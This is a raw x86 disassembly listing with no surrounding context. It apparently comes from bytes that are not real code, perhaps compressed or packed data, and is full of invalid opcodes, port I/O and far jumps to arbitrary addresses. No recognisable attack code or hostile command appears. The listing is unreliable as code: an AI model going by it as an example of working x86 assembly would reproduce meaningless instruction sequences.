  42553c:	sub    DWORD PTR [edi+ecx*8-0x1950f51b],ebp
  425543:	lahf   
  425544:	jmp    0x48f56573
  425549:	in     eax,dx
  42554a:	repz xor ah,bh
  42554d:	rcl    DWORD PTR [edi-0x28c184b7],1
  425553:	test   al,0x8
  425555:	call   0x93e4:0xc244e13f
  42555c:	fsub   QWORD PTR cs:[ebx+0x57]
  425560:	out    dx,eax
  425561:	fadd   DWORD PTR [edx+0x6b]
  425564:	adc    edx,ebp
  425566:	sbb    esp,edi
  425568:	and    ah,BYTE PTR [ebx]
  42556a:	mov    ah,0x83
  42556c:	mov    ch,0x84
  42556e:	mov    edx,0xaddd3cde
  425573:	retf   0x48ca
  425576:	fst    DWORD PTR [edi]
  425578:	cmp    al,0xa7
  42557a:	in     al,0x8
  42557c:	(bad)  
  42557d:	stos   BYTE PTR es:[edi],al
  42557e:	sti    
  42557f:	sub    eax,0xeb0881e1
  425584:	call   0x3668:0xd4eaa637
  42558b:	fs xchg edi,eax
  42558d:	mov    bl,0xd1
  42558f:	imul   ecx,DWORD PTR [ebx],0x28acf6b1
  425595:	jo     0x425612
  425597:	cld    
  425598:	(bad)  
  425599:	stos   BYTE PTR es:[edi],al
  42559a:	cwde   
  42559b:	inc    edx
  42559c:	sbb    eax,0xd6b78008
  4255a1:	mov    bl,0xa6
  4255a3:	sub    al,0xbb
  4255a5:	lock popa 
  4255a7:	fiadd  WORD PTR [ecx-0x7033ac67]
  4255ad:	dec    edx
  4255ae:	mov    dh,0xe6
  4255b0:	jmp    0xc32a:0x80439a3a
  4255b7:	pop    eax
  4255b8:	pop    ebx
  4255b9:	ficom  DWORD PTR [esi]
  4255bb:	in     al,0xac
  4255bd:	sub    ecx,DWORD PTR [ebx+0xb890e2]
	...
  425633:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	nop
  425641:	lock push ss
  425643:	add    ebp,DWORD PTR [esi+ecx*4+0xf60001]
  42564a:	add    BYTE PTR [eax],al
  42564c:	add    BYTE PTR [edx],al
  42564e:	push   0xffffffd7
  425650:	sbb    edx,DWORD PTR [edi+0x71c8d2a1]
  425656:	mov    ch,0x4b
  425658:	jno    0x425630
  42565a:	out    dx,eax
  42565b:	mov    eax,0xb09051fc
  425660:	dec    esp
  425661:	test   al,0x6
  425663:	and    DWORD PTR [edx-0x334f8aad],esp
  425669:	aaa    
  42566a:	sbb    BYTE PTR [ebp+0x16],ah
  42566d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42566e:	mov    fs,WORD PTR [ebp+0x3613aa7c]
  425674:	and    dh,0x26
  425677:	push   edi
  425678:	pusha  
  425679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42567a:	ins    DWORD PTR es:[edi],dx
  42567b:	not    DWORD PTR [ebp+edi*8-0x65fdb015]
  425682:	jg     0x42563a
  425684:	push   esp
  425685:	shr    DWORD PTR [edx+0x2f],cl
  425688:	repz mov eax,0x86515902
  42568e:	fst    QWORD PTR [ecx-0x37]
  425691:	cwde   
  425692:	mov    BYTE PTR [ebx-0x53106c95],cl
  425698:	and    eax,DWORD PTR [ebx]
  42569a:	and    BYTE PTR [ecx+0x3eb7a6f4],0x0
  4256a1:	in     al,dx
  4256a2:	cmp    bl,al
  4256a4:	(bad)  
  4256a5:	mov    BYTE PTR [edi-0x6d87a455],bl
  4256ab:	pop    edx
  4256ac:	cmp    ah,dh
  4256ae:	mov    bh,BYTE PTR [ebp-0x3c]
  4256b1:	jae    0x42566a
  4256b3:	in     al,dx
  4256b4:	xchg   edi,eax
  4256b5:	pop    ecx
  4256b6:	jmp    0x57ab3458
  4256bb:	iret   
  4256bc:	sar    BYTE PTR [eax],cl
  4256be:	pop    ss
  4256bf:	jmp    0x425691
  4256c1:	call   0xedcf66e
  4256c6:	mov    esp,0xcff515ff
  4256cb:	sti    
  4256cc:	mov    esp,0x66e225cb
  4256d1:	sbb    al,0x2e
  4256d3:	ds retf 0x2c99
  4256d7:	add    eax,0x66d24c55
  4256dc:	daa    
  4256dd:	add    ch,dh
  4256df:	imul   edx,DWORD PTR [edx+0x34],0x64
  4256e3:	sub    esi,DWORD PTR [ebx]
  4256e5:	sub    dl,dl
  4256e7:	jns    0x425728
  4256e9:	lea    edx,[ebp-0x3a453ec8]
  4256ef:	lock add dl,dh
  4256f2:	sbb    ebx,edi
  4256f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256f5:	mov    cl,0xbc
  4256f7:	dec    ebp
  4256f8:	inc    eax
  4256f9:	shl    edx,cl
  4256fb:	shr    BYTE PTR [ebx+0x6ecfed41],0x18
  425702:	dec    ecx
  425703:	retf   
  425704:	add    DWORD PTR [ebp+0x22],edi
  425707:	fmul   QWORD PTR [eax+0x5a0c4a79]
  42570d:	pop    ss
  42570e:	mov    edx,0x5c41bb68
  425713:	ins    DWORD PTR es:[edi],dx
  425714:	lods   eax,DWORD PTR ds:[esi]
  425715:	xor    DWORD PTR [ecx-0x3275ec9],eax
  42571b:	outs   dx,DWORD PTR ds:[esi]
  42571c:	fsubr  st(5),st
  42571e:	ds aam 0x7d
  425721:	cdq    
  425722:	sub    DWORD PTR [eax],edx
  425724:	xor    DWORD PTR ds:0xdb87a1d7,ebp
  42572a:	mov    DWORD PTR [ebp-0x6bd55d7f],ebp
  425730:	(bad)  
  425732:	imul   edi,DWORD PTR [edi-0xc80f6aa],0xf6ea4a4f
  42573c:	mov    cl,0xa8
  42573e:	add    bl,BYTE PTR [ebp+0x23]
  425741:	imul   eax,DWORD PTR [eax],0x0
	...
  4257b3:	add    BYTE PTR [edx],ah
  4257b5:	pop    eax
  4257b6:	test   bh,ch
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	xchg   DWORD PTR [ecx-0x705d7691],esp
  4257c6:	add    DWORD PTR [eax],eax
  4257c8:	test   BYTE PTR [eax],0x0
  4257cb:	add    ch,bl
  4257cd:	and    BYTE PTR [ebx+0x51],dh
  4257d0:	xchg   edi,eax
  4257d1:	push   0xe769417c
  4257d6:	add    ecx,DWORD PTR [eax-0x49]
  4257d9:	cmc    
  4257da:	cli    
  4257db:	fwait
  4257dc:	mov    edx,0xde907e99
  4257e1:	xor    bh,BYTE PTR [ebx-0x76d56ca0]
  4257e7:	cdq    
  4257e8:	pop    ss
  4257e9:	mov    ebx,0x920d5263
  4257ee:	adc    al,0x74
  4257f0:	rol    esp,cl
  4257f2:	nop
  4257f3:	in     eax,0xb2
  4257f5:	sub    BYTE PTR [ebp+0x34f1266f],ah
  4257fb:	mov    ax,0xc188
  4257ff:	out    0xd6,al
  425801:	imul   ebp,DWORD PTR [edi-0x4d],0xb82d0574
  425808:	mov    al,0xbe
  42580a:	iret   
  42580b:	fistp  DWORD PTR [eax]
  42580d:	dec    esp
  42580e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42580f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425810:	dec    esi
  425811:	leave  
  425812:	test   BYTE PTR [eax],dl
  425814:	ret    0xf38a
  425817:	jle    0x425860
  425819:	mov    BYTE PTR [ebx],dl
  42581b:	jmp    0x2b62:0xb39697cc
  425822:	das    
  425823:	popf   
  425824:	icebp  
  425825:	jb     0x425869
  425827:	aad    0x32
  425829:	setae  BYTE PTR [ecx-0x42]
  42582d:	retf   0x1488
  425830:	mov    al,0x69
  425832:	(bad)  
  425833:	imul   eax,edx,0x3faa06d3
  425839:	dec    edi
  42583a:	pop    edi
  42583b:	jmp    DWORD PTR [ebx-0x69f94fe6]
  425841:	sar    BYTE PTR [edx-0x26ac1e18],1
  425847:	mov    BYTE PTR cs:[ecx+0x2a],bh
  42584b:	mov    esp,0xe81e1156
  425850:	push   ebx
  425851:	jmp    FWORD PTR [edx+0x38d5f305]
  425857:	out    0x18,eax
  425859:	dec    esp
  42585a:	std    
  42585b:	inc    ecx
  42585c:	gs cmp al,0xe4
  42585f:	push   0x36
  425861:	inc    ecx
  425862:	pop    ecx
  425863:	ja     0x4258a0
  425865:	inc    bp
  425867:	dec    ebp
  425868:	and    cl,BYTE PTR [eax]
  42586a:	sub    eax,0xa9aa3af0
  42586f:	ins    DWORD PTR es:[edi],dx
  425870:	add    BYTE PTR [esi+ebx*2+0x45],ah
  425874:	jbe    0xdac2b46b
  42587a:	das    
  42587b:	pop    edi
  42587c:	push   ecx
  42587d:	pop    ds
  42587e:	pushf  
  42587f:	xor    esp,DWORD PTR [edi]
  425881:	cmp    DWORD PTR [esi+ebx*4],0xf2e4cb14
  425888:	test   BYTE PTR [esi+0x3723edfd],bh
  42588e:	push   ebp
  42588f:	dec    edi
  425890:	jl     0x4258fb
  425892:	add    eax,0x556f9d1
  425897:	push   cs
  425898:	xchg   esp,eax
  425899:	sub    esp,DWORD PTR [ecx]
  42589b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42589c:	cmc    
  42589d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42589e:	addr16 mov bh,0xe4
  4258a1:	adc    al,0xa0
  4258a3:	ds stos BYTE PTR es:[edi],al
  4258a5:	stos   DWORD PTR es:[edi],eax
  4258a6:	pusha  
  4258a7:	inc    edi
  4258a8:	fcmovbe st,st(1)
  4258aa:	and    eax,0xe2cfb5ed
  4258af:	(bad)  
  4258b0:	sbb    al,al
  4258b2:	retf   0x9233
  4258b5:	sub    edi,esi
  4258b7:	popa   
  4258b8:	xchg   esi,eax
  4258b9:	adc    ebx,DWORD PTR [eax]
  4258bb:	mov    BYTE PTR [ecx],cl
  4258bd:	jne    0x425912
  4258bf:	leave  
  4258c0:	(bad)  
  4258c1:	lock add BYTE PTR [eax],al
	...
  425934:	imul   ebx,DWORD PTR [eax],0x63
  425937:	push   0x73
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	inc    edx
  425941:	mov    ch,BYTE PTR ds:0x19098b4
  425947:	add    dh,dh
  425949:	add    BYTE PTR [eax],al
  42594b:	add    BYTE PTR [ecx+0xf67e680],cl
  425951:	in     al,0x24
  425953:	(bad)  
  425954:	mov    ebx,0x47db1eeb
  425959:	push   esp
  42595a:	je     0x4259b2
  42595c:	push   ebp
  42595d:	sbb    esp,esp
  42595f:	pop    ds
  425960:	bound  esi,QWORD PTR [ecx+0x4480cbd0]
  425966:	arpl   WORD PTR [ebx+0x6a81068a],ax
  42596c:	call   0x636a49d1
  425971:	dec    esp
  425972:	leave  
  425973:	rcr    DWORD PTR [esi+edx*4-0x1b0db63c],1
  42597a:	pop    edi
  42597b:	test   al,0xc2
  42597d:	adc    DWORD PTR ds:0xa34946e2,ebx
  425983:	lods   eax,DWORD PTR ds:[esi]
  425984:	sub    al,0xc0
  425986:	jmp    0x67fba461
  42598b:	mov    WORD PTR [edx+0x29],fs
  42598e:	int3   
  42598f:	xchg   ebp,eax
  425990:	mul    ah
  425992:	jbe    0x42594e
  425994:	pusha  
  425995:	sbb    eax,0x57f4b08f
  42599a:	cmc    
  42599b:	(bad)  
  42599c:	add    al,0x23
  42599e:	xchg   edi,eax
  42599f:	pop    es
  4259a0:	and    DWORD PTR [edx+esi*8-0x7],eax
  4259a4:	xor    BYTE PTR [ebp-0x569cd545],cl
  4259aa:	daa    
  4259ab:	(bad)  
  4259ac:	call   0x6503dbb9
  4259b1:	mov    dl,0xca
  4259b3:	and    esi,DWORD PTR [ebx-0x4f5713d]
  4259b9:	add    DWORD PTR [eax],esi
  4259bb:	fs ja  0x42595f
  4259be:	sbb    bh,cl
  4259c0:	xchg   ecx,eax
  4259c1:	xchg   ebp,eax
  4259c2:	or     ah,ah
  4259c4:	lds    ebp,FWORD PTR [ebx]
  4259c6:	in     eax,dx
  4259c7:	dec    edi
  4259c8:	clc    
  4259c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259ca:	(bad)  
  4259cc:	jl     0x4259ea
  4259ce:	repz cli 
  4259d0:	jno    0x425982
  4259d2:	daa    
  4259d3:	inc    esp
  4259d4:	jne    0x425a4d
  4259d6:	mov    al,ds:0x16f8b973
  4259db:	lea    esp,[ecx+0xf250391]
  4259e1:	dec    esi
  4259e2:	mov    esp,0x81c2caed
  4259e7:	sub    dh,BYTE PTR [ecx]
  4259e9:	or     al,0xda
  4259eb:	adc    al,0x43
  4259ed:	js     0x425997
  4259ef:	ins    BYTE PTR es:[edi],dx
  4259f0:	loope  0x4259eb
  4259f2:	xor    esi,DWORD PTR [esi+ebx*2+0x78f74862]
  4259f9:	cmp    al,0x45
  4259fb:	not    BYTE PTR [eax+0x18664691]
  425a01:	dec    edx
  425a02:	fistp  DWORD PTR [ecx+0x63bcf1eb]
  425a08:	bound  edx,QWORD PTR [ebp-0x1e]
  425a0b:	xchg   ecx,eax
  425a0c:	cmp    eax,0x35627d7f
  425a11:	test   DWORD PTR [ebx+0x655d66e9],esp
  425a17:	outs   dx,DWORD PTR es:[esi]
  425a19:	int    0xa4
  425a1b:	xchg   esi,eax
  425a1c:	mov    dh,0xde
  425a1e:	fwait
  425a1f:	adc    BYTE PTR [ebx-0x4e],al
  425a22:	mov    bh,0x59
  425a24:	pushf  
  425a25:	adc    BYTE PTR [ecx+0x6f4cc6cf],dh
  425a2b:	lock and eax,0xcd52e793
  425a31:	in     eax,dx
  425a32:	in     eax,dx
  425a33:	div    esp
  425a35:	inc    ecx
  425a36:	pop    ss
  425a37:	sbb    edi,DWORD PTR [ecx+0x12d0f232]
  425a3d:	jnp    0x425a6c
  425a3f:	adc    BYTE PTR ds:0x37,cl
	...
  425ab1:	add    BYTE PTR [eax],al
  425ab3:	add    BYTE PTR [esi],al
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	rcr    edi,0xe6
  425ac3:	jno    0x425a53
  425ac5:	xchg   ecx,eax
  425ac6:	add    DWORD PTR [eax],eax
  425ac8:	test   BYTE PTR [eax],0x0
  425acb:	add    BYTE PTR [esi-0x3f],ch
  425ace:	cmp    DWORD PTR [edx],edi
  425ad0:	and    eax,0xfe32d53b
  425ad5:	dec    eax
  425ad6:	pop    esp
  425ad7:	jmp    0x425a6d
  425ad9:	add    al,0x83
  425adb:	dec    esi
  425adc:	into   
  425add:	fimul  DWORD PTR [edi-0x2f7c5931]
  425ae3:	pop    esp
  425ae4:	xor    DWORD PTR [edx],edx
  425ae6:	fidivr WORD PTR [eax-0x6e4e90bc]
  425aec:	cmp    eax,0xa6836c24
  425af1:	test   eax,0xc82e8e76
  425af6:	hlt    
  425af7:	int    0xfe
  425af9:	(bad)  
  425afa:	fcomp  DWORD PTR [ecx]
  425afc:	pop    ss
  425afd:	js     0x425b41
  425aff:	sbb    DWORD PTR [ecx+0x4b],esp
  425b02:	inc    eax
  425b03:	mov    eax,0x650fc0fc
  425b08:	jne    0x425b03
  425b0a:	pop    eax
  425b0b:	xchg   esi,eax
  425b0c:	jg     0x425b15
  425b0e:	std    
  425b0f:	in     al,dx
  425b10:	add    al,0xaf
  425b12:	dec    edx
  425b13:	jl     0x425b3d
  425b15:	mov    bl,0x99
  425b17:	test   DWORD PTR [ebp+0x4f],eax
  425b1a:	loopne 0x425ab0
  425b1c:	mov    bh,0x32
  425b1e:	xlat   BYTE PTR ds:[ebx]
  425b1f:	pusha  
  425b20:	fcos   
  425b22:	arpl   cx,di
  425b24:	iret   
  425b25:	xlat   BYTE PTR ds:[ebx]
  425b26:	jmp    0x425ae4
  425b28:	xor    BYTE PTR [esi-0xe],bl
  425b2b:	push   0x8ec190c6
  425b30:	inc    edx
  425b31:	and    al,0x5
  425b33:	jle    0x425ac8
  425b35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b36:	hlt    
  425b37:	inc    BYTE PTR [edi]
  425b39:	pop    ss
  425b3a:	xchg   ebx,eax
  425b3b:	sub    al,0x16
  425b3d:	xchg   BYTE PTR [edi+edx*1],cl
  425b40:	addr16 repz mov edx,0xb8c80f29
  425b47:	or     BYTE PTR [ebp-0x3e],0x8e
  425b4b:	dec    ebx
  425b4c:	pop    ecx
  425b4d:	addr16 pop ss
  425b4f:	ins    BYTE PTR es:[di],dx
  425b51:	inc    esp
  425b52:	rol    eax,1
  425b54:	push   ecx
  425b55:	dec    ecx
  425b56:	outs   dx,DWORD PTR ds:[esi]
  425b57:	pop    esp
  425b58:	clc    
  425b59:	jae    0x425b58
  425b5b:	dec    esp
  425b5c:	pop    ecx
  425b5d:	int    0x40
  425b5f:	xor    eax,0xce74cf
  425b64:	pop    esi
  425b65:	hlt    
  425b66:	scas   al,BYTE PTR es:[edi]
  425b67:	mov    dl,0xe9
  425b69:	out    dx,al
  425b6a:	leave  
  425b6b:	leave  
  425b6c:	pop    eax
  425b6d:	test   al,0xd6
  425b6f:	aad    0x2e
  425b71:	loop   0x425b74
  425b73:	sub    eax,0xe4e9a81e
  425b78:	pop    esp
  425b79:	ss icebp 
  425b7b:	mov    edx,0x4ecacc55
  425b80:	xor    edx,DWORD PTR [ecx-0x5d]
  425b83:	jl     0x425b93
  425b85:	fimul  WORD PTR [edi+0x1e]
  425b88:	das    
  425b89:	sar    BYTE PTR [eax+0x113bf90d],0x4f
  425b90:	mov    bl,ch
  425b92:	fwait
  425b93:	lds    ebx,FWORD PTR [ecx-0x33]
  425b96:	push   ebp
  425b97:	pop    ecx
  425b98:	lock scas eax,DWORD PTR es:[edi]
  425b9a:	mov    cl,0xe7
  425b9c:	std    
  425b9d:	(bad)  
  425b9e:	cmp    al,0xfc
  425ba0:	loopne 0x425b25
  425ba2:	rol    DWORD PTR [ebp+ebp*2-0x24820525],1
  425ba9:	inc    ebx
  425baa:	push   edx
  425bab:	inc    ebp
  425bac:	ja     0x425b69
  425bae:	mov    eax,ds:0xf0a702d0
  425bb3:	or     eax,0x74a4e3a1
  425bb8:	out    dx,al
  425bb9:	loop   0x425bc9
  425bbb:	gs (bad) 
  425bbd:	jmp    0x0:0xc5fb773b
	...
  425c34:	ins    BYTE PTR es:[edi],dx
  425c35:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  425c3c:	cli    
  425c3d:	sub    ch,cl
  425c3f:	call   0x9284:0x649792d7
  425c46:	add    DWORD PTR [eax],eax
  425c48:	test   BYTE PTR [eax],0x0
  425c4b:	add    BYTE PTR [ebx-0x2e5a80fa],cl
  425c51:	and    DWORD PTR [esp+ebx*8],ebp
  425c54:	sub    BYTE PTR ds:0x9eb2a82e,bl
  425c5a:	scas   eax,DWORD PTR es:[edi]
  425c5b:	cmp    edx,esi
  425c5d:	push   ds
  425c5e:	pop    eax
  425c5f:	ins    BYTE PTR es:[edi],dx
  425c60:	jmp    0x425c4b
  425c62:	jns    0x425cb6
  425c64:	out    dx,eax
  425c65:	popa   
  425c66:	out    dx,al
  425c67:	test   al,0x3b
  425c69:	leave  
  425c6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c6b:	mov    eax,0x92e6574b
  425c70:	jle    0x425cd4
  425c72:	fisttp WORD PTR [esi+0x2b0bf11e]
  425c78:	(bad)  [ecx+0x76b6825d]
  425c7e:	and    BYTE PTR [ebp-0x43],ch
  425c81:	push   es
  425c82:	inc    ebp
  425c83:	mov    BYTE PTR [eax+0xd08793a],ah
  425c89:	add    ebx,DWORD PTR [ebx-0x3b41321f]
  425c8f:	sti    
  425c90:	add    BYTE PTR [eax],cl
  425c92:	lds    ebp,FWORD PTR [ebx+0xf7e45fd]
  425c98:	push   edx
  425c99:	sub    BYTE PTR [ebx+0x5c3da26e],dl
  425c9f:	aam    0xe8
  425ca1:	jmp    0x425cdb
  425ca3:	in     eax,0xcb
  425ca5:	sub    DWORD PTR [edx-0x59],esp
  425ca8:	(bad)  
  425ca9:	pop    ebp
  425caa:	mov    DWORD PTR [edi-0x3d],ecx
  425cad:	and    DWORD PTR [ebx-0x2b],ebx
  425cb0:	imul   ebx,DWORD PTR [eax],0xffffff87
  425cb3:	jbe    0x425d33
  425cb5:	push   ds
  425cb6:	cmp    ebp,ebp
  425cb8:	dec    edi
  425cb9:	or     al,0xb8
  425cbb:	jnp    0x425c64
  425cbd:	fdivr  QWORD PTR [eax]
  425cbf:	mov    eax,ds:0x9dbde399
  425cc4:	adc    BYTE PTR [bp+di+0x27],bh
  425cc8:	dec    ebx
  425cc9:	pop    es
  425cca:	xor    eax,0x6a5b42c3
  425ccf:	mov    eax,ds:0xb5e7f486
  425cd4:	in     eax,0x5d
  425cd6:	fwait
  425cd7:	cmp    ecx,edx
  425cd9:	sub    dh,BYTE PTR [edx-0x2e]
  425cdc:	cmp    ebp,DWORD PTR [ebx+ebp*4+0x4f]
  425ce0:	mov    ah,0xfd
  425ce2:	mov    bl,0x81
  425ce4:	or     ebx,DWORD PTR [edx+0x73807d1e]
  425cea:	push   ds
  425ceb:	(bad)  
  425cec:	xlat   BYTE PTR ds:[ebx]
  425ced:	and    DWORD PTR [esi*8-0x408d15a3],ecx
  425cf4:	int    0x5f
  425cf6:	pop    ebx
  425cf7:	and    eax,0xabd8f62d
  425cfc:	mov    fs,WORD PTR [edx-0x43]
  425cff:	xchg   edx,eax
  425d00:	mov    DWORD PTR [edi],esi
  425d02:	pop    esp
  425d03:	fwait
  425d04:	std    
  425d05:	jl     0x425d26
  425d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d08:	cmp    eax,DWORD PTR [esi-0x3f]
  425d0b:	lods   al,BYTE PTR ds:[esi]
  425d0c:	imul   esp,DWORD PTR [ebp-0x54240305],0x62
  425d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d14:	scas   al,BYTE PTR es:[edi]
  425d15:	and    cl,BYTE PTR [ebp+eax*2-0x721b4b9b]
  425d1c:	cmp    eax,0x8a05b76a
  425d21:	cli    
  425d22:	jl     0x425cc3
  425d24:	xchg   esi,eax
  425d25:	ss cs pop edi
  425d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d29:	in     eax,dx
  425d2a:	dec    eax
  425d2b:	stos   DWORD PTR es:[edi],eax
  425d2c:	adc    al,0x39
  425d2e:	sti    
  425d2f:	mul    BYTE PTR [ebx+0x6b]
  425d32:	jle    0x425db3
  425d34:	jo     0x425cdc
  425d36:	or     ch,BYTE PTR [ebp+0x259c6f55]
  425d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d3d:	push   ebx
  425d3e:	leave  
  425d3f:	cmp    BYTE PTR [ecx-0x4],cl
	...
  425db2:	add    BYTE PTR [eax],al
  425db4:	cmp    eax,0xf361d20c
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	push   ecx
  425dc1:	xor    eax,0x937aeeae
  425dc6:	add    DWORD PTR [eax],eax
  425dc8:	test   BYTE PTR [eax],0x0
  425dcb:	add    BYTE PTR [ebx],bh
  425dcd:	xchg   BYTE PTR [ecx-0x6ab2003d],bh
  425dd3:	fsub   DWORD PTR [eax+edx*2+0x11cf98fa]
  425dda:	bound  eax,QWORD PTR [ebp+0x53]
  425ddd:	gs xchg esi,eax
  425ddf:	ret    
  425de0:	mov    al,ds:0x6a4979a4
  425de5:	pop    edx
  425de6:	xor    edx,DWORD PTR [eax]
  425de8:	leave  
  425de9:	outs   dx,DWORD PTR ds:[esi]
  425dea:	imul   ebp,DWORD PTR [ecx+ebx*1-0x386b63d1],0x52657b64
  425df5:	mov    eax,ds:0x6068c882
  425dfa:	dec    eax
  425dfb:	fimul  DWORD PTR [ebx+0x4fb5172f]
  425e01:	jp     0x425e31
  425e03:	xchg   BYTE PTR [esi-0x21],dl
  425e06:	es jecxz 0x425dd7
  425e09:	scas   al,BYTE PTR es:[edi]
  425e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e0b:	adc    BYTE PTR [edx+0x3d],cl
  425e0e:	pop    es
  425e0f:	in     eax,0x46
  425e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e12:	ja     0x425e87
  425e14:	dec    ebx
  425e15:	aaa    
  425e16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e17:	rcl    ecx,1
  425e19:	in     al,dx
  425e1a:	retf   0x246f
  425e1d:	fidivr DWORD PTR [eax+0x4a2ce102]
  425e23:	pushf  
  425e24:	push   ebx
  425e25:	lds    edi,FWORD PTR [eax]
  425e27:	popf   
  425e28:	retf   
  425e29:	rol    DWORD PTR [ebx+0x4906e04b],0xb0
  425e30:	ins    DWORD PTR es:[edi],dx
  425e31:	or     DWORD PTR [edi],0xc43e0d35
  425e37:	test   al,0x84
  425e39:	clc    
  425e3a:	mov    WORD PTR [edx+0x6098b2cb],?
  425e40:	or     DWORD PTR [ebx],esi
  425e42:	ror    BYTE PTR [edx],1
  425e44:	int3   
  425e45:	pop    ss
  425e46:	js     0x425e1f
  425e48:	jo     0x425e19
  425e4a:	adc    cl,BYTE PTR [eax]
  425e4c:	stos   DWORD PTR es:[edi],eax
  425e4d:	or     al,BYTE PTR [eax+0x1b6dfc1d]
  425e53:	fadd   DWORD PTR [bp-0x25]
  425e57:	jle    0x425eaf
  425e59:	inc    DWORD PTR [edi]
  425e5b:	mov    ch,BYTE PTR [ecx+0x10c0ca8b]
  425e61:	ds push es
  425e63:	sbb    al,0xcd
  425e65:	jl     0x425e2d
  425e67:	adc    al,0x7d
  425e69:	mov    dh,0xbb
  425e6b:	repz dec ebx
  425e6d:	or     al,0x61
  425e6f:	mov    ebp,0x1d2f0a9c
  425e74:	stos   DWORD PTR es:[edi],eax
  425e75:	or     DWORD PTR [eax],ebp
  425e77:	les    edi,FWORD PTR [eax-0x4c]
  425e7a:	xchg   esp,eax
  425e7b:	add    al,0xd2
  425e7d:	add    BYTE PTR [ebx],ah
  425e7f:	fs jl  0x425e3c
  425e82:	mov    dl,0x24
  425e84:	ret    
  425e85:	es xchg ecx,eax
  425e87:	out    0x92,al
  425e89:	dec    esp
  425e8a:	jb     0x425e0f
  425e8c:	xchg   BYTE PTR [edi-0x638dadb8],al
  425e92:	adc    DWORD PTR [ecx+0x4f],edi
  425e95:	std    
  425e96:	cmp    esi,edx
  425e98:	shl    DWORD PTR [ebx],cl
  425e9a:	dec    ebx
  425e9b:	jo     0x425ed4
  425e9d:	pop    edi
  425e9e:	mov    ds:0x3d66ba06,eax
  425ea3:	sahf   
  425ea4:	sbb    bl,dl
  425ea6:	rol    DWORD PTR [eax+eiz*2],0xf1
  425eaa:	es cmp edx,esi
  425ead:	sbb    eax,0x7dc41f39
  425eb2:	dec    edi
  425eb3:	ds addr16 cdq 
  425eb6:	lock mov bh,0x5c
  425eb9:	dec    ebp
  425eba:	pop    eax
  425ebb:	outs   dx,BYTE PTR ds:[esi]
  425ebc:	add    eax,0x30be53d8
  425ec1:	leave  
	...
  425f32:	add    BYTE PTR [eax],al
  425f34:	dec    ebx
  425f35:	push   ss
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx+0xf]
  425f41:	sub    DWORD PTR [ecx+0x1947039],esp
  425f47:	add    dh,dh
  425f49:	add    BYTE PTR [eax],al
  425f4b:	add    BYTE PTR [edx+0x12],ah
  425f4e:	sub    ah,BYTE PTR [edx+0x7a7893e]
  425f54:	gs or  bl,ah
  425f57:	pop    esi
  425f58:	mov    WORD PTR [ebx-0x4b96efe6],fs
  425f5e:	sub    eax,0x2d36d38d
  425f63:	dec    al
  425f65:	fiadd  WORD PTR [esi+0x514401c2]
  425f6b:	cmp    al,0xbc
  425f6d:	or     ebp,esp
  425f6f:	mov    ds:0x8632c423,eax
  425f74:	push   ebx
  425f75:	jo     0x425f05
  425f77:	pop    eax
  425f78:	test   BYTE PTR [ebp+0x487151b6],cl
  425f7e:	or     eax,0xbefbb07e
  425f83:	inc    ebp
  425f84:	mul    BYTE PTR [eax+0x9]
  425f87:	push   0x9bd8c7d2
  425f8c:	xchg   ecx,eax
  425f8d:	mov    eax,ds:0x74de953e
  425f92:	cmp    BYTE PTR [esi],ah
  425f94:	push   ebx
  425f95:	scas   eax,DWORD PTR es:[edi]
  425f96:	inc    esp
  425f97:	xchg   edi,eax
  425f98:	stos   BYTE PTR es:[edi],al
  425f99:	int3   
  425f9a:	sbb    ecx,ecx
  425f9c:	nop
  425f9d:	cs ja  0x425fc7
  425fa0:	xchg   ecx,eax
  425fa1:	fcom   DWORD PTR [esi-0x77]
  425fa4:	and    bl,BYTE PTR [ecx+0xefe4eea]
  425faa:	mov    cl,0xa2
  425fac:	xchg   edx,eax
  425fad:	mov    cl,0xbf
  425faf:	ss cwde 
  425fb1:	xor    ah,BYTE PTR [edi-0x5260dbb3]
  425fb7:	push   cs
  425fb8:	push   ebp
  425fb9:	call   DWORD PTR [esi+0x8]
  425fbc:	out    0xef,eax
  425fbe:	(bad)
  425fc1:	or     BYTE PTR [ecx],0xc
  425fc4:	test   eax,edx
  425fc6:	xor    eax,0xa411f507
  425fcb:	(bad)
  425fcf:	int    0x9e
  425fd1:	push   cs
  425fd2:	sar    dl,cl
  425fd4:	adc    esi,DWORD PTR ds:0x1e551786
  425fda:	sub    DWORD PTR [ebx-0x6b338852],eax
  425fe0:	mov    ebp,0xe342a96
  425fe5:	call   0x98138e56
  425fea:	fs aaa 
  425fec:	cmc    
  425fed:	adc    ecx,ecx
  425fef:	mov    edx,0xe99fe177
  425ff4:	ins    DWORD PTR es:[edi],dx
